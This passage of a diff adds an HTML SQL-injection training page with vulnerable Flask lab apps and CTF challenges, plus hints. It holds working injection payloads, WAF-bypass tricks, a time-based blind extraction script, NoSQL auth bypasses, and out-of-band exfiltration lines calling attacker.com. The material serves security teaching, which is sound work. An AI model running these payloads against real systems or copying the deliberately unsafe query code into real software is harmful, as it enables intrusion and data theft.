+        break
+
+print(f"\n[+] Flag: {flag}")</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Confirm time-based injection works: <code>/check?id=1 AND sleep(3)</code> — response should take ~3 seconds</li>
+              <li>The page always returns "OK" regardless of the query — no boolean oracle available</li>
+              <li>Use <code>CASE WHEN</code> with <code>sleep()</code> to conditionally delay based on character matches</li>
+              <li>Run the solve script and adjust the delay threshold if needed for network latency</li>
+              <li>Optimize: use binary search on ASCII values to reduce requests per character</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 5: Error-Based Data Extraction</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Extract data using database error messages — no UNION required.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — Error-based SQLi (MySQL simulation with SQLite)
+from flask import Flask, request
+import sqlite3
+
+app = Flask(__name__)
+
+def init_db():
+    conn = sqlite3.connect('errorbased.db')
+    c = conn.cursor()
+    c.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)')
+    c.execute("INSERT OR IGNORE INTO users (id, username, password) VALUES (1, 'admin', 'FL4G{3rr0r_b4s3d}')")
+    conn.commit()
+    conn.close()
+
+init_db()
+
+@app.route('/user')
+def user():
+    uid = request.args.get('id', '1')
+    conn = sqlite3.connect('errorbased.db')
+    c = conn.cursor()
+    try:
+        c.execute(f"SELECT username FROM users WHERE id = {uid}")
+        result = c.fetchone()
+        conn.close()
+        return f'&lt;h1&gt;User: {result[0]}&lt;/h1&gt;' if result else '&lt;h1&gt;Not found&lt;/h1&gt;'
+    except Exception as e:
+        conn.close()
+        return f'&lt;h1&gt;Error&lt;/h1&gt;&lt;p&gt;{e}&lt;/p&gt;'
+
+app.run(debug=True)</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Trigger an error: <code>/user?id='</code></li>
+              <li>Use CASE expressions to leak data in error messages</li>
+              <li>Try subquery in error context: <code>1 AND 1=CAST((SELECT password FROM users LIMIT 1) AS INTEGER)</code></li>
+              <li>Extract the flag from the error message output</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 6: Stacked Queries</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Use stacked queries to insert a new admin user into the database.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — Stacked queries lab
+from flask import Flask, request
+import sqlite3
+
+app = Flask(__name__)
+
+def init_db():
+    conn = sqlite3.connect('stacked.db')
+    c = conn.cursor()
+    c.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT, role TEXT)')
+    c.execute("INSERT OR IGNORE INTO users (id, username, password, role) VALUES (1, 'admin', 'unkn0wn!', 'admin')")
+    c.execute("INSERT OR IGNORE INTO users (id, username, password, role) VALUES (2, 'guest', 'guest', 'user')")
+    conn.commit()
+    conn.close()
+
+init_db()
+
+@app.route('/search')
+def search():
+    q = request.args.get('q', '')
+    conn = sqlite3.connect('stacked.db')
+    try:
+        # executescript allows multiple statements (stacked queries)
+        conn.executescript(f"SELECT * FROM users WHERE username = '{q}'")
+        conn.close()
+        return '&lt;h1&gt;Search complete&lt;/h1&gt;'
+    except Exception as e:
+        conn.close()
+        return f'&lt;p&gt;Error: {e}&lt;/p&gt;'
+
+@app.route('/login', methods=['POST'])
+def login():
+    user = request.form.get('username', '')
+    pw = request.form.get('password', '')
+    conn = sqlite3.connect('stacked.db')
+    c = conn.cursor()
+    c.execute("SELECT * FROM users WHERE username = ? AND password = ?", (user, pw))
+    result = c.fetchone()
+    conn.close()
+    if result and result[3] == 'admin':
+        return '&lt;h1&gt;FLAG{st4ck3d_qu3r13s_pwn}&lt;/h1&gt;'
+    if result:
+        return f'&lt;h1&gt;Hello {result[1]}, you are not admin&lt;/h1&gt;'
+    return '&lt;h1&gt;Login failed&lt;/h1&gt;'
+
+app.run(debug=True)</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>The search uses <code>executescript</code> which supports stacked queries</li>
+              <li>Inject: <code>'; INSERT INTO users (username, password, role) VALUES ('hacker','hacker','admin'); --</code></li>
+              <li>Login as <code>hacker:hacker</code> with admin role to get the flag</li>
+              <li>Alternative: <code>'; UPDATE users SET password='hacked' WHERE username='admin'; --</code></li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 7: Second-Order SQL Injection</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Register a user with a malicious username that triggers SQLi when used in a later query.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — Second-order SQLi
+from flask import Flask, request
+import sqlite3
+
+app = Flask(__name__)
+
+def init_db():
+    conn = sqlite3.connect('second.db')
+    c = conn.cursor()
+    c.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)')
+    c.execute('CREATE TABLE IF NOT EXISTS secrets (id INTEGER PRIMARY KEY, owner TEXT, data TEXT)')
+    c.execute("INSERT OR IGNORE INTO users (id, username, password) VALUES (1, 'admin', 'sup3r_s3cur3')")
+    c.execute("INSERT OR IGNORE INTO secrets (id, owner, data) VALUES (1, 'admin', 'FL4G{s3c0nd_0rd3r}')")
+    conn.commit()
+    conn.close()
+
+init_db()
+
+@app.route('/register', methods=['GET', 'POST'])
+def register():
+    if request.method == 'POST':
+        user = request.form.get('username', '')
+        pw = request.form.get('password', '')
+        conn = sqlite3.connect('second.db')
+        # Registration uses parameterized query — safe!
+        conn.execute("INSERT INTO users (username, password) VALUES (?, ?)", (user, pw))
+        conn.commit()
+        conn.close()
+        return f'&lt;p&gt;Registered as {user}. &lt;a href="/profile?user={user}"&gt;View profile&lt;/a&gt;&lt;/p&gt;'
+    return '''&lt;h1&gt;Register&lt;/h1&gt;&lt;form method="POST"&gt;
+    &lt;input name="username" placeholder="Username"&gt;
+    &lt;input name="password" placeholder="Password"&gt;
+    &lt;button&gt;Register&lt;/button&gt;&lt;/form&gt;'''
+
+@app.route('/profile')
+def profile():
+    user = request.args.get('user', '')
+    conn = sqlite3.connect('second.db')
+    c = conn.cursor()
+    c.execute("SELECT username FROM users WHERE username = ?", (user,))
+    row = c.fetchone()
+    if not row:
+        return '&lt;p&gt;User not found&lt;/p&gt;'
+    # Vulnerable: stored username used unsafely in a second query
+    username = row[0]
+    c.execute(f"SELECT data FROM secrets WHERE owner = '{username}'")
+    secrets = c.fetchall()
+    conn.close()
+    html = f'&lt;h1&gt;Profile: {username}&lt;/h1&gt;'
+    for s in secrets:
+        html += f'&lt;p&gt;Secret: {s[0]}&lt;/p&gt;'
+    return html
+
+app.run(debug=True)</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Register is safe (parameterized) — but the username is stored as-is</li>
+              <li>Register as: <code>' OR 1=1 --</code> (this gets stored in the DB)</li>
+              <li>Visit your profile — the profile query injects the stored username unsafely</li>
+              <li>The query becomes: <code>SELECT data FROM secrets WHERE owner = '' OR 1=1 --'</code></li>
+              <li>All secrets (including admin's flag) are returned</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 8: SQLi in JSON Body</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Exploit SQL injection through a JSON API request body.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — SQLi in JSON
+from flask import Flask, request, jsonify
+import sqlite3
+
+app = Flask(__name__)
+
+def init_db():
+    conn = sqlite3.connect('jsonapi.db')
+    c = conn.cursor()
+    c.execute('CREATE TABLE IF NOT EXISTS products (id INTEGER PRIMARY KEY, name TEXT, category TEXT)')
+    c.execute('CREATE TABLE IF NOT EXISTS flags (id INTEGER PRIMARY KEY, flag TEXT)')
+    c.execute("INSERT OR IGNORE INTO products (id, name, category) VALUES (1, 'Laptop', 'electronics')")
+    c.execute("INSERT OR IGNORE INTO products (id, name, category) VALUES (2, 'Book', 'education')")
+    c.execute("INSERT OR IGNORE INTO flags (id, flag) VALUES (1, 'FL4G{js0n_sql1}')")
+    conn.commit()
+    conn.close()
+
+init_db()
+
+@app.route('/api/products', methods=['POST'])
+def products():
+    data = request.get_json()
+    category = data.get('category', 'all')
+    conn = sqlite3.connect('jsonapi.db')
+    c = conn.cursor()
+    try:
+        c.execute(f"SELECT name, category FROM products WHERE category = '{category}'")
+        rows = c.fetchall()
+        conn.close()
+        return jsonify([{"name": r[0], "category": r[1]} for r in rows])
+    except Exception as e:
+        conn.close()
+        return jsonify({"error": str(e)}), 500
+
+app.run(debug=True)</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Normal request: <code>curl -X POST -H "Content-Type: application/json" -d '{"category":"electronics"}' http://localhost:5000/api/products</code></li>
+              <li>Inject via JSON: <code>{"category":"' UNION SELECT flag,flag FROM flags --"}</code></li>
+              <li>Note how the single quote in JSON must be properly escaped in the JSON string</li>
+              <li>Try enumerating tables first with <code>sqlite_master</code></li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 9: SQLi in XML (SOAP-style)</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Inject SQL through an XML request body parsed by the backend.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — SQLi in XML
+from flask import Flask, request
+import sqlite3
+import xml.etree.ElementTree as ET
+
+app = Flask(__name__)
+
+def init_db():
+    conn = sqlite3.connect('xmlapi.db')
+    c = conn.cursor()
+    c.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, email TEXT)')
+    c.execute('CREATE TABLE IF NOT EXISTS secrets (id INTEGER PRIMARY KEY, data TEXT)')
+    c.execute("INSERT OR IGNORE INTO users (id, username, email) VALUES (1, 'admin', 'admin@corp.com')")
+    c.execute("INSERT OR IGNORE INTO secrets (id, data) VALUES (1, 'FL4G{xml_sql1_c0mb0}')")
+    conn.commit()
+    conn.close()
+
+init_db()
+
+@app.route('/api/lookup', methods=['POST'])
+def lookup():
+    try:
+        root = ET.fromstring(request.data)
+        username = root.find('username').text
+        conn = sqlite3.connect('xmlapi.db')
+        c = conn.cursor()
+        c.execute(f"SELECT username, email FROM users WHERE username = '{username}'")
+        row = c.fetchone()
+        conn.close()
+        if row:
+            return f'&lt;result&gt;&lt;user&gt;{row[0]}&lt;/user&gt;&lt;email&gt;{row[1]}&lt;/email&gt;&lt;/result&gt;'
+        return '&lt;result&gt;Not found&lt;/result&gt;'
+    except Exception as e:
+        return f'&lt;error&gt;{e}&lt;/error&gt;'
+
+app.run(debug=True)</code></pre>
+<pre><code class="language-bash"># Normal request
+curl -X POST -H "Content-Type: application/xml" \
+  -d '&lt;request&gt;&lt;username&gt;admin&lt;/username&gt;&lt;/request&gt;' \
+  http://localhost:5000/api/lookup
+
+# SQLi payload
+curl -X POST -H "Content-Type: application/xml" \
+  -d "&lt;request&gt;&lt;username&gt;' UNION SELECT data,'x' FROM secrets --&lt;/username&gt;&lt;/request&gt;" \
+  http://localhost:5000/api/lookup</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Send a normal XML lookup request for the admin user</li>
+              <li>Inject SQL inside the <code>&lt;username&gt;</code> XML element</li>
+              <li>Use UNION to extract from the <code>secrets</code> table</li>
+              <li>Note: XML special chars (<code>&amp;</code>, <code>&lt;</code>) may need CDATA wrapping</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 10: WAF Bypass Techniques</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Bypass a SQL injection WAF using various evasion techniques.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — SQLi with WAF
+import re
+from flask import Flask, request
+import sqlite3
+
+app = Flask(__name__)
+
+def init_db():
+    conn = sqlite3.connect('waf.db')
+    c = conn.cursor()
+    c.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)')
+    c.execute("INSERT OR IGNORE INTO users (id, username, password) VALUES (1, 'admin', 'FL4G{w4f_byp4ss3d}')")
+    conn.commit()
+    conn.close()
+
+init_db()
+
+def waf(payload):
+    blocked = ['union', 'select', 'from', 'where', 'or ', 'and ', '--', '#', '/*']
+    lower = payload.lower()
+    for word in blocked:
+        if word in lower:
+            return True
+    return False
+
+@app.route('/search')
+def search():
+    q = request.args.get('q', '')
+    if waf(q):
+        return '&lt;h1&gt;WAF: Blocked!&lt;/h1&gt;'
+    conn = sqlite3.connect('waf.db')
+    c = conn.cursor()
+    try:
+        c.execute(f"SELECT username FROM users WHERE username LIKE '%{q}%'")
+        rows = c.fetchall()
+        conn.close()
+        return '&lt;br&gt;'.join(r[0] for r in rows) or '&lt;p&gt;No results&lt;/p&gt;'
+    except Exception as e:
+        conn.close()
+        return f'&lt;p&gt;Error: {e}&lt;/p&gt;'
+
+app.run(debug=True)</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Confirm standard payloads are blocked by the WAF</li>
+              <li>Bypass techniques:
+                <ul>
+                  <li>Case variation: <code>UniOn SeLeCt</code> — blocked (lowered)</li>
+                  <li>Inline comments: <code>UN/**/ION SEL/**/ECT</code></li>
+                  <li>Double URL encoding: <code>%2527</code></li>
+                  <li>The WAF blocks <code>or </code> (with space) but not <code>||</code></li>
+                  <li>Use <code>%0a</code> (newline) instead of spaces</li>
+                </ul>
+              </li>
+              <li>Craft a working payload that extracts the admin password</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 11: Out-of-Band SQLi</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Exfiltrate data via DNS or HTTP requests from the database server when no direct output is available.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — OOB SQLi concept lab
+# Note: True OOB requires MySQL/MSSQL with network access
+# This lab simulates the concept with SQLite + requests
+from flask import Flask, request
+import sqlite3, requests as req
+
+app = Flask(__name__)
+
+def init_db():
+    conn = sqlite3.connect('oob.db')
+    c = conn.cursor()
+    c.execute('CREATE TABLE IF NOT EXISTS secrets (id INTEGER PRIMARY KEY, flag TEXT)')
+    c.execute("INSERT OR IGNORE INTO secrets (id, flag) VALUES (1, 'FL4G{00b_3xf1l}')")
+    conn.commit()
+    conn.close()
+
+init_db()
+
+def sqlite_http(url):
+    """Simulates DB-initiated HTTP request (like MySQL LOAD_FILE or MSSQL xp_dirtree)"""
+    try: req.get(url, timeout=2)
+    except: pass
+    return 0
+
+@app.route('/api/check')
+def check():
+    uid = request.args.get('id', '1')
+    conn = sqlite3.connect('oob.db')
+    conn.create_function('http_request', 1, sqlite_http)
+    c = conn.cursor()
+    try:
+        c.execute(f"SELECT id FROM secrets WHERE id = {uid}")
+        c.fetchall()
+    except: pass
+    conn.close()
+    return '{"status":"ok"}', 200
+
+app.run(debug=True)</code></pre>
+<pre><code class="language-sql">-- Real-world OOB payloads (MySQL/MSSQL):
+-- MySQL: SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\a'));
+-- MSSQL: EXEC master..xp_dirtree '\\' + (SELECT TOP 1 flag FROM secrets) + '.attacker.com\a'
+-- Oracle: SELECT UTL_HTTP.REQUEST('http://attacker.com/' || (SELECT flag FROM secrets)) FROM dual;</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Start a listener: <code>python3 -m http.server 9999</code></li>
+              <li>Inject: <code>1 AND http_request('http://YOUR_IP:9999/' || (SELECT flag FROM secrets))</code></li>
+              <li>Check your HTTP server logs for the exfiltrated data</li>
+              <li>Understand why OOB is needed when blind and in-band both fail</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 12: NoSQL Injection</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Bypass authentication in a MongoDB-backed application using NoSQL injection operators.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — NoSQL injection (requires: pip install flask pymongo)
+from flask import Flask, request, jsonify
+from pymongo import MongoClient
+
+app = Flask(__name__)
+client = MongoClient('localhost', 27017)
+db = client['nosqli_lab']
+
+# Seed data
+db.users.delete_many({})
+db.users.insert_one({"username": "admin", "password": "FL4G{n0sql_1nj3ct10n}", "role": "admin"})
+db.users.insert_one({"username": "guest", "password": "guest123", "role": "user"})
+
+@app.route('/login', methods=['POST'])
+def login():
+    data = request.get_json()
+    username = data.get('username', '')
+    password = data.get('password', '')
+    # Vulnerable: passes user input directly as query operators
+    user = db.users.find_one({"username": username, "password": password})
+    if user:
+        return jsonify({"message": f"Welcome {user['username']}!", "role": user['role']})
+    return jsonify({"error": "Invalid credentials"}), 401
+
+app.run(debug=True)</code></pre>
+<pre><code class="language-bash"># Normal login
+curl -X POST -H "Content-Type: application/json" \
+  -d '{"username":"guest","password":"guest123"}' http://localhost:5000/login
+
+# NoSQL injection — bypass auth
+curl -X POST -H "Content-Type: application/json" \
+  -d '{"username":"admin","password":{"$ne":""}}' http://localhost:5000/login
+
+# Extract password with $regex
+curl -X POST -H "Content-Type: application/json" \
+  -d '{"username":"admin","password":{"$regex":"^FL4G"}}' http://localhost:5000/login</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Login normally as guest — confirm it works</li>
+              <li>Use <code>{"$ne":""}</code> as the password to bypass auth</li>
+              <li>Use <code>{"$regex":"^..."}</code> to extract the password character by character</li>
+              <li>Write a script to automate the regex-based extraction</li>
+            </ol>
+          </div>
+        </div>
+      </div>
+
+      <!-- CTF TAB -->
+      <div class="tab-content" id="ctf">
+        <h2>CTF Challenges</h2>
+
+        <div class="ctf-card">
+          <h4>Challenge 1: Bypass the Gate</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">A login page with a SQL backend. Find a way to authenticate without valid credentials. The flag is displayed after login.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># server.py — Auth bypass CTF
+from flask import Flask, request
+import sqlite3
+
+app = Flask(__name__)
+
+def init_db():
+    conn = sqlite3.connect('ctf1.db')
+    c = conn.cursor()
+    c.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)')
+    c.execute("INSERT OR IGNORE INTO users (id, username, password) VALUES (1, 'admin', 'Xy7!kL9@mN2#')")
+    conn.commit()
+    conn.close()
+
+init_db()
+
+@app.route('/', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        user = request.form.get('username', '')
+        pw = request.form.get('password', '')
+        conn = sqlite3.connect('ctf1.db')
+        c = conn.cursor()
+        query = f"SELECT * FROM users WHERE username = '{user}' AND password = '{pw}'"
+        c.execute(query)
+        result = c.fetchone()
+        conn.close()
+        if result:
+            return '&lt;h1&gt;FLAG{sql1_l0g1n_byp4ss3d}&lt;/h1&gt;'
+        return '&lt;h1&gt;Access Denied&lt;/h1&gt;'
+    return '''&lt;h1&gt;Secure Login&lt;/h1&gt;
+    &lt;form method="POST"&gt;
+        &lt;input name="username" placeholder="Username"&gt;&lt;br&gt;
+        &lt;input name="password" type="password" placeholder="Password"&gt;&lt;br&gt;
+        &lt;button&gt;Login&lt;/button&gt;
+    &lt;/form&gt;'''
+
+app.run(debug=True)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Try <code>' OR 1=1 -- -</code> in the username field with any password. The query becomes:
+            <code>SELECT * FROM users WHERE username = '' OR 1=1 -- -' AND password = '...'</code> — the OR makes the WHERE always true and the comment removes the password check.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 2: Dump the Database</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">A product search page has a SQLi vulnerability. Enumerate the hidden tables and extract the flag stored in a secret table.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># server.py — Database dump CTF
+from flask import Flask, request
+import sqlite3
+
+app = Flask(__name__)
+
+def init_db():
+    conn = sqlite3.connect('ctf2.db')
+    c = conn.cursor()
+    c.execute('CREATE TABLE IF NOT EXISTS items (id INTEGER PRIMARY KEY, name TEXT, description TEXT)')
+    c.execute('CREATE TABLE IF NOT EXISTS s3cret_fl4gs (id INTEGER PRIMARY KEY, flag TEXT, note TEXT)')
+    c.execute("INSERT OR IGNORE INTO items (id, name, description) VALUES (1, 'Widget A', 'A fine widget')")
+    c.execute("INSERT OR IGNORE INTO items (id, name, description) VALUES (2, 'Widget B', 'A better widget')")
+    c.execute("INSERT OR IGNORE INTO s3cret_fl4gs (id, flag, note) VALUES (1, 'FLAG{dum9_1t_4ll}', 'You found me!')")
+    conn.commit()
+    conn.close()
+
+init_db()
+
+@app.route('/search')
+def search():
+    q = request.args.get('q', '')
+    conn = sqlite3.connect('ctf2.db')
+    c = conn.cursor()
+    query = f"SELECT name, description FROM items WHERE name LIKE '%{q}%'"
+    try:
+        c.execute(query)
+        rows = c.fetchall()
+    except Exception as e:
+        conn.close()
+        return f'&lt;h1&gt;Error&lt;/h1&gt;&lt;p&gt;{e}&lt;/p&gt;'
+    conn.close()
+    html = '&lt;h1&gt;Search Results&lt;/h1&gt;'
+    for row in rows:
+        html += f'&lt;p&gt;&lt;b&gt;{row[0]}&lt;/b&gt;: {row[1]}&lt;/p&gt;'
+    if not rows:
+        html += '&lt;p&gt;No results found.&lt;/p&gt;'
+    return html
+
+app.run(debug=True)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Step 1:</strong> Close the LIKE string and add a UNION: <code>' UNION SELECT name, sql FROM sqlite_master WHERE type='table' -- -</code><br>
+            <strong>Step 2:</strong> You'll see a table called <code>s3cret_fl4gs</code> with columns <code>id, flag, note</code>.<br>
+            <strong>Step 3:</strong> Extract the flag: <code>' UNION SELECT flag, note FROM s3cret_fl4gs -- -</code></p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 3: Blind Exfiltration</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">The page shows no query results and no error messages. Extract the flag from the database using only boolean or time-based inference.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># server.py — Blind exfiltration CTF
+from flask import Flask, request
+import sqlite3, time
+
+app = Flask(__name__)
+
+def init_db():
+    conn = sqlite3.connect('ctf3.db')
+    c = conn.cursor()
+    c.execute('CREATE TABLE IF NOT EXISTS vault (id INTEGER PRIMARY KEY, secret TEXT)')
+    c.execute("INSERT OR IGNORE INTO vault (id, secret) VALUES (1, 'FLAG{bl1nd_3xf1l_pr0}')")
+    conn.commit()
+    conn.close()
+
+def sqlite_sleep(n):
+    time.sleep(n)
+    return 0
+
+init_db()
+
+@app.route('/api/status')
+def status():
+    uid = request.args.get('id', '1')
+    conn = sqlite3.connect('ctf3.db')
+    conn.create_function('sleep', 1, sqlite_sleep)
+    c = conn.cursor()
+    try:
+        c.execute(f"SELECT id FROM vault WHERE id = {uid}")
+        c.fetchall()
+    except:
+        pass
+    conn.close()
+    # Always returns the same response
+    return '{"status": "ok"}', 200, {'Content-Type': 'application/json'}
+
+app.run(debug=True)</code></pre>
+<pre><code class="language-python"># solve.py — Blind CTF solver
+import requests, string, time
+
+url = "http://127.0.0.1:5000/api/status"
+flag = ""
+
+# First discover the table name via time-based
+# 1 AND (SELECT CASE WHEN (SELECT COUNT(*) FROM vault)>0 THEN sleep(2) ELSE 0 END)
+
+for pos in range(1, 30):
+    found = False
+    lo, hi = 32, 126
+    while lo &lt;= hi:
+        mid = (lo + hi) // 2
+        # Is the char > mid?
+        payload = (
+            f"1 AND (SELECT CASE WHEN "
+            f"unicode(SUBSTR((SELECT secret FROM vault LIMIT 1),{pos},1))>{mid} "
+            f"THEN sleep(1) ELSE 0 END)"
+        )
+        start = time.time()
+        requests.get(url, params={"id": payload})
+        if time.time() - start >= 1:
+            lo = mid + 1
+        else:
+            hi = mid - 1
+    if lo > 126:
+        break
+    flag += chr(lo)
+    print(f"[+] {flag}")
+
+print(f"\n[+] Flag: {flag}")</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Step 1:</strong> The endpoint always returns <code>{{"status": "ok"}}</code> — no boolean oracle from the response body.<br>
+            <strong>Step 2:</strong> Use time-based blind injection with the custom <code>sleep()</code> function.<br>
+            <strong>Step 3:</strong> First discover tables: try <code>1 AND (SELECT CASE WHEN (SELECT name FROM sqlite_master LIMIT 1)='vault' THEN sleep(2) ELSE 0 END)</code><br>
+            <strong>Step 4:</strong> Use the binary search solver script — it uses <code>unicode(SUBSTR(...))</code> with a binary search to reduce the number of requests from ~95 per character down to ~7.<br>
+            <strong>Step 5:</strong> Adjust the sleep threshold based on network latency.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 4: Multi-Database Extraction</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">The app connects to two databases. Find and extract the flag hidden in the non-default database.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># server.py
+from flask import Flask, request
+import sqlite3
+
+app = Flask(__name__)
+
+def init_db():
+    conn = sqlite3.connect('main.db')
+    c = conn.cursor()
+    c.execute('CREATE TABLE IF NOT EXISTS items (id INTEGER PRIMARY KEY, name TEXT)')
+    c.execute("INSERT OR IGNORE INTO items (id, name) VALUES (1, 'Widget')")
+    c.execute(f"ATTACH DATABASE 'hidden.db' AS hidden")
+    c.execute('CREATE TABLE IF NOT EXISTS hidden.vault (id INTEGER PRIMARY KEY, flag TEXT)')
+    c.execute("INSERT OR IGNORE INTO hidden.vault (id, flag) VALUES (1, 'FLAG{multi_db_extr4ct}')")
+    conn.commit()
+    conn.close()
+
+init_db()
+
+@app.route('/item')
+def item():
+    iid = request.args.get('id', '1')
+    conn = sqlite3.connect('main.db')
+    conn.execute("ATTACH DATABASE 'hidden.db' AS hidden")
+    c = conn.cursor()
+    try:
+        c.execute(f"SELECT name FROM items WHERE id = {iid}")
+        row = c.fetchone()
+        conn.close()
+        return f'&lt;p&gt;{row[0]}&lt;/p&gt;' if row else '&lt;p&gt;Not found&lt;/p&gt;'
+    except Exception as e:
+        conn.close()
+        return f'&lt;p&gt;{e}&lt;/p&gt;'
+
+app.run(debug=True)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>SQLite attached databases are queryable with the <code>dbname.tablename</code> syntax.<br>
+            Enumerate attached databases: <code>0 UNION SELECT name FROM pragma_database_list</code><br>
+            Then list tables in the hidden db: <code>0 UNION SELECT name FROM hidden.sqlite_master</code><br>
+            Extract: <code>0 UNION SELECT flag FROM hidden.vault</code></p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 5: SQLi via HTTP Headers</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">The app logs user requests including HTTP headers into a database. Inject SQL through a header value.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># server.py
+from flask import Flask, request
+import sqlite3
+
+app = Flask(__name__)
+
+def init_db():
+    conn = sqlite3.connect('headers.db')
+    c = conn.cursor()
+    c.execute('CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY, ua TEXT, ip TEXT)')
+    c.execute('CREATE TABLE IF NOT EXISTS secrets (id INTEGER PRIMARY KEY, flag TEXT)')
+    c.execute("INSERT OR IGNORE INTO secrets (id, flag) VALUES (1, 'FLAG{h3ader_1nj3ct10n}')")
+    conn.commit()
+    conn.close()
+
+init_db()
+
+@app.route('/')
+def index():
+    ua = request.headers.get('User-Agent', 'unknown')
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    conn = sqlite3.connect('headers.db')
+    try:
+        conn.execute(f"INSERT INTO logs (ua, ip) VALUES ('{ua}', '{ip}')")
+        conn.commit()
+    except: pass
+    conn.close()
+    return '&lt;h1&gt;Welcome&lt;/h1&gt;'
+
+@app.route('/logs')
+def logs():
+    conn = sqlite3.connect('headers.db')
+    c = conn.cursor()
+    c.execute("SELECT ua, ip FROM logs ORDER BY id DESC LIMIT 10")
+    rows = c.fetchall()
+    conn.close()
+    html = '&lt;h1&gt;Recent Logs&lt;/h1&gt;'
+    for r in rows:
+        html += f'&lt;p&gt;UA: {r[0]} | IP: {r[1]}&lt;/p&gt;'
+    return html
+
+app.run(debug=True)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Inject via the <code>User-Agent</code> or <code>X-Forwarded-For</code> header.<br>
+            <code>curl -H "User-Agent: ' || (SELECT flag FROM secrets) || '" http://localhost:5000/</code><br>
+            Then visit <code>/logs</code> to see the exfiltrated data in the log output.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 6: Boolean Blind with Filtering</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Extract the flag character by character. The WAF blocks spaces and common SQL keywords.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># server.py
+from flask import Flask, request
+import sqlite3
+
+app = Flask(__name__)
+
+def init_db():
+    conn = sqlite3.connect('filtered.db')
+    c = conn.cursor()
+    c.execute('CREATE TABLE IF NOT EXISTS vault (id INTEGER PRIMARY KEY, flag TEXT)')
+    c.execute("INSERT OR IGNORE INTO vault (id, flag) VALUES (1, 'FLAG{f1lt3r3d_bl1nd}')")
+    conn.commit()
+    conn.close()
+
+init_db()
+
+@app.route('/check')
+def check():
+    uid = request.args.get('id', '1')
+    blocked = [' ', 'select', 'union', 'from', 'where']
+    for b in blocked:
+        if b in uid.lower():
